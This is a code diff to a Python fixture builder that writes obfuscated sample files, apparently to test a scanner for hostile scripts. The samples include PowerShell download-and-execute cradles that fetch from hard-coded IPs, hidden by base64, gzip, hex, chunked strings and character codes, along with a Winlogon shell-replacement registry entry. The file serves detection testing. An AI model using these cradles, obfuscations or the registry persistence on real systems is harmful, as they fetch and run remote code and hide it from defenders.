@@ -238,6 +238,10 @@ def build_folder(root):
     _gzp = _gz.compress(b"powershell IEX (New-Object Net.WebClient).DownloadString('http://8.8.8.8/a') " * 2)
     w("gzpeek.ps1", b"$d = '" + _b64.b64encode(_gzp) + b"'; IEX $d\n")
     w("hexpeek.ps1", b"$h = '" + (b"powershell -w hidden -enc IEX http://3.4.5.6/a " * 2).hex().encode() + b"'; IEX $h\n")
+    import base64 as _b
+    _blob = _b.b64encode(b"powershell IEX (New-Object Net.WebClient).DownloadString('http://12.12.12.12/a') " * 2)
+    _chunks = b"' + '".join(_blob[i:i + 60] for i in range(0, len(_blob), 60))
+    w("chunkedb64.ps1", b"$d = '" + _chunks + b"'; IEX $d\n")
     w("decpeek.js", b"var s = String.fromCharCode(" + ", ".join(str(c) for c in b"powershell iex http://2.3.4.5/x ").encode() + b"); eval(s);\n")
     w("concat.ps1", b"$w = New-Object Net.WebClient; \"ie\"+\"x\"($w.DownloadString('http://10.1.1.1/a'))\n")
     w("winlogon.reg", b'RegEdit4\r\n[HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon]\r\n"Shell"="expl.exe"\r\n')
